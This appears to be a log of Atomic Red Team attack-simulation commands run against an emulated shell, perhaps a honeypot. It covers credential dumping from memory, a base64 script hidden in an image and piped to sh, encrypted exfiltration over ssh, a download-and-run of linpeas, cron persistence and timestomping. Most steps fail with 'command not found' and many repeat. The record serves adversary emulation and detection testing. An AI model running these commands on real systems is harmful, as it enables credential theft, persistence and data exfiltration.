+response:grep '*:0:' /etc/passwd >> /tmp/T1087.001.txt
+
+
+action:
+command:cat /tmp/T1087.001.txt 2>/dev/null
+response:cat /tmp/T1087.001.txt 2>/dev/null
+
+
+action:
+command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+response:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+bash: [: command not found
+
+
+action:
+command:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+response:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+bash: if: command not found
+bash: then: command not found
+bash: python3: command not found
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:who -a
+
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:who -a
+
+
+action:
+command:echo '#!/bin/sh' > /tmp/T1003.007.sh
+response:echo '#!/bin/sh' > /tmp/T1003.007.sh
+
+
+action:
+command:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+response:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+
+
+action:
+command:echo "Python 2.7+ or 3.4+ must be installed"
+response:echo "Python 2.7+ or 3.4+ must be installed"
+
+
+action:
+command:sh /tmp/T1003.007.sh
+response:sh /tmp/T1003.007.sh
+
+
+action:
+command:PID=$(pgrep -n -f "T1003.007")
+response:PID=$(pgrep -n -f "T1003.007")
+
+
+action:
+command:PYTHON=$(which python || which python3 || which python2)
+response:PYTHON=$(which python || which python3 || which python2)
+
+
+action:
+command:$PYTHON /home/atomic/T1003.007/src/dump_heap.py $PID /tmp/T1003.007.bin
+response:$PYTHON /home/atomic/T1003.007/src/dump_heap.py $PID /tmp/T1003.007.bin
+bash: $: command not found
+bash: $: command not found
+
+
+action:
+command:grep -i "PASS" "/tmp/T1003.007.bin"
+response:grep -i "PASS" "/tmp/T1003.007.bin"
+
+
+action:
+command:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+response:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+
+
+action:
+command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+response:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:echo missing ldapsearch command; exit 1
+response:echo missing ldapsearch command; exit 1
+
+
+action:
+command:ldapsearch -H ldap://example.com:389 -x -D user@example.com -w s3CurePssw0rD! -b "CN=Users,DC=example,DC=com" "(objectClass=group)" -s sub -a always -z 1000 dn 
+response:ldapsearch -H ldap://example.com:389 -x -D user@example.com -w s3CurePssw0rD! -b "CN=Users,DC=example,DC=com" "(objectClass=group)" -s sub -a always -z 1000 dn 
+
+
+action:
+command:echo '#!/bin/sh' > /tmp/T1003.007.sh
+response:echo '#!/bin/sh' > /tmp/T1003.007.sh
+bash: ldapsearch: command not found
+
+
+action:
+command:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+response:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+
+
+action:
+command:sh /tmp/T1003.007.sh
+response:sh /tmp/T1003.007.sh
+
+
+action:
+command:PID=$(pgrep -n -f "T1003.007")
+response:PID=$(pgrep -n -f "T1003.007")
+bash: $: command not found
+root@svr04:~# 
+
+action:
+command:HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
+response:HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
+bash: syntax error: unexpected end of file
+root@svr04:~# 
+
+action:
+command:MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
+response:root@svr04:~# MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
+bash: cut: command not found
+root@svr04:~# bash: $: command not found
+root@svr04:~# 
+
+action:
+command:MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
+response:MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
+bash: cut: command not found
+root@svr04:~# bash: $: command not found
+root@svr04:~# 
+
+action:
+command:MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
+response:MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
+bash: $: command not found
+root@svr04:~# 
+
+action:
+command:dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+response:dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:pip install requests    
+response:pip install requests    
+bash: pip: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo 'T1070.006 file access timestomp test' > /tmp/T1070.006-access.txt
+response:echo 'T1070.006 file access timestomp test' > /tmp/T1070.006-access.txt
+
+
+action:
+command:touch -a -t 197001010000.00 /tmp/T1070.006-access.txt
+response:touch -a -t 197001010000.00 /tmp/T1070.006-access.txt
+
+
+action:
+command:echo '#!/bin/sh' > /tmp/T1003.007.sh
+response:echo '#!/bin/sh' > /tmp/T1003.007.sh
+
+
+action:
+command:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+response:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+
+
+action:
+command:sh /tmp/T1003.007.sh
+response:sh /tmp/T1003.007.sh
+
+
+action:
+command:PID=$(pgrep -n -f "T1003.007")
+response:PID=$(pgrep -n -f "T1003.007")
+bash: $: command not found
+root@svr04:~# 
+
+action:
+command:HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
+response:HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
+bash: syntax error: unexpected end of file
+root@svr04:~# 
+
+action:
+command:MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
+response:MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
+bash: cut: command not found
+root@svr04:~# bash: $: command not found
+root@svr04:~# 
+
+action:
+command:MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
+response:MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
+bash: cut: command not found
+root@svr04:~# bash: $: command not found
+root@svr04:~# 
+
+action:
+command:MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
+response:MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
+bash: $: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'
+response:tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:who -a
+
+
+action:
+command:(which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)
+response:(which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)
+
+
+action:
+command:if [ "$(uname)" = 'FreeBSD' ]; then cmd="netstat -Sp tcp"; else cmd="netstat -ant"; fi;
+response:if [ "$(uname)" = 'FreeBSD' ]; then cmd="netstat -Sp tcp"; else cmd="netstat -ant"; fi;
+
+
+action:
+command:if [ -x "$(command -v arp)" ]; then arp -a; else echo "arp is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v arp)" ]; then arp -a; else echo "arp is missing from the machine. skipping..."; fi;
+bash: yum: command not found
+
+
+action:
+command:if [ -x "$(command -v ifconfig)" ]; then ifconfig; else echo "ifconfig is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v ifconfig)" ]; then ifconfig; else echo "ifconfig is missing from the machine. skipping..."; fi;
+
+
+action:
+command:if [ -x "$(command -v ip)" ]; then ip addr; else echo "ip is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v ip)" ]; then ip addr; else echo "ip is missing from the machine. skipping..."; fi;
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if [ -x "$(command -v netstat)" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo "netstat is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v netstat)" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo "netstat is missing from the machine. skipping..."; fi;
+bash: if: command not found
+bash: uniq: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# bash: sort: command not found
+root@svr04:~# 
+
+action:
+command:pip install requests
+response:pip install requests
+bash: pip: command not found
+root@svr04:~# 
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:which_python=$(which python || which python3 || which python3.9 || which python2)
+bash: $: command not found
+
+
+action:
+command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+response:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+
+
+action:
+command:if [ ! -d /tmp/T1030 ]; then mkdir -p /tmp/T1030; touch /tmp/T1030/safe_to_delete; fi; dd if=/dev/urandom of=/tmp/T1030/T1030_urandom bs=25000000 count=1
+response:if [ ! -d /tmp/T1030 ]; then mkdir -p /tmp/T1030; touch /tmp/T1030/safe_to_delete; fi; dd if=/dev/urandom of=/tmp/T1030/T1030_urandom bs=25000000 count=1
+
+
+action:
+command:cd /tmp/T1030; split -b 5000000 T1030_urandom
+response:cd /tmp/T1030; split -b 5000000 T1030_urandom
+
+
+action:
+command:ls -l /tmp/T1030
+response:ls -l /tmp/T1030
+bash: split: command not found
+
+
+action:
+command:echo "Automated installer not implemented yet, please install chsh manually"
+response:echo "Automated installer not implemented yet, please install chsh manually"
+
+
+action:
+command:[ "$(uname)" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art
+response:[ "$(uname)" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art
+bash: [: command not found
+bash: pw: command not found
+
+
+action:
+command:cat /etc/passwd |grep ^art
+response:cat /etc/passwd |grep ^art
+
+
+action:
+command:chsh -s /bin/sh art
+response:chsh -s /bin/sh art
+bash: chsh: command not found
+root@svr04:~# 
+
+action:
+command:cat /etc/passwd |grep ^art
+response:cat /etc/passwd |grep ^art
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:pip install requests
+response:pip install requests
+bash: pip: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo "echo '*/5     *       *       *       *       root    echo "Hello from Atomic Red Team"' > /tmp/atomic.log" > /etc/cron.d/persistevil
+response:echo "echo '*/5     *       *       *       *       root    echo "Hello from Atomic Red Team"' > /tmp/atomic.log" > /etc/cron.d/persistevil
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo 'T1070.006 file modification timestomp test' > /tmp/T1070.006-modification.txt
+response:echo 'T1070.006 file modification timestomp test' > /tmp/T1070.006-modification.txt
+
+
+action:
+command:touch -m -t 197001010000.00 /tmp/T1070.006-modification.txt
+response:touch -m -t 197001010000.00 /tmp/T1070.006-modification.txt
+
+
+action:
+command:echo '#!/bin/sh' > /tmp/T1003.007.sh
+response:echo '#!/bin/sh' > /tmp/T1003.007.sh
+
+
+action:
+command:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+response:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+
+
+action:
+command:echo "Python 2.7+ or 3.4+ must be installed"
+response:echo "Python 2.7+ or 3.4+ must be installed"
+
+
+action:
+command:sh /tmp/T1003.007.sh
+response:sh /tmp/T1003.007.sh
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:who -a
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+
+
+action:
+command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+response:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:Install-Module -Name VMware.PowerCLI
+response:Install-Module -Name VMware.PowerCLI
+bash: Install-Module: command not found
+root@svr04:~# 
+
+action:
+command:Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
+response:Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
+bash: Set-PowerCLIConfiguration: command not found
+root@svr04:~# 
+
+action:
+command:Connect-VIServer -Server atomic.local -User root -Password pass
+response:Connect-VIServer -Server atomic.local -User root -Password pass
+bash: Connect-VIServer: command not found
+root@svr04:~# 
+
+action:
+command:Get-VMHostService -VMHost atomic.local | Where-Object {$_.Key -eq "TSM-SSH" } | Start-VMHostService -Confirm:$false
+response:Get-VMHostService -VMHost atomic.local | Where-Object {$_.Key -eq "TSM-SSH" } | Start-VMHostService -Confirm:$false
+bash: Start-VMHostService: command not found
+root@svr04:~# bash: Where-Object: command not found
+root@svr04:~# bash: Get-VMHostService: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:root@svr04:~# if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+
+
+action:
+command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+response:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:cat /etc/shells 
+response:cat /etc/shells 
+
+
+action:
+command:echo '#!/bin/sh' > /tmp/T1003.007.sh
+response:echo '#!/bin/sh' > /tmp/T1003.007.sh
+
+
+action:
+command:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+response:echo "sh -c 'echo \"The password is T1003.007\" && sleep 30' &" >> /tmp/T1003.007.sh
+
+
+action:
+command:sh /tmp/T1003.007.sh
+response:sh /tmp/T1003.007.sh
+
+
+action:
+command:PID=$(pgrep -n -f "T1003.007")
+response:PID=$(pgrep -n -f "T1003.007")
+bash: $: command not found
+root@svr04:~# 
+
+action:
+command:HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
+response:HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
+bash: syntax error: unexpected end of file
+root@svr04:~# 
+
+action:
+command:MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
+response:MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
+bash: cut: command not found
+root@svr04:~# bash: $: command not found
+root@svr04:~# 
+
+action:
+command:MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
+response:MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
+bash: cut: command not found
+root@svr04:~# bash: $: command not found
+root@svr04:~# 
+
+action:
+command:MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
+response:MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
+bash: $: command not found
+root@svr04:~# 
+
+action:
+command:dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+response:root@svr04:~# dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+
+
+action:
+command:grep -i "PASS" "/tmp/T1003.007.bin"
+response:grep -i "PASS" "/tmp/T1003.007.bin"
+
+
+action:
+command:pip install requests    
+response:pip install requests    
+bash: pip: command not found
+root@svr04:~# 
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:which_python=$(which python || which python3 || which python3.9 || which python2)
+bash: $: command not found
+
+
+action:
+command:echo 'import requests' > T1059.006.py
+response:echo 'import requests' > T1059.006.py
+
+
+action:
+command:echo 'import os' >> T1059.006.py
+response:echo 'import os' >> T1059.006.py
+
+
+action:
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+
+
+action:
+command:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+response:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+
+
+action:
+command:echo 'session = requests.session()' >> T1059.006.py
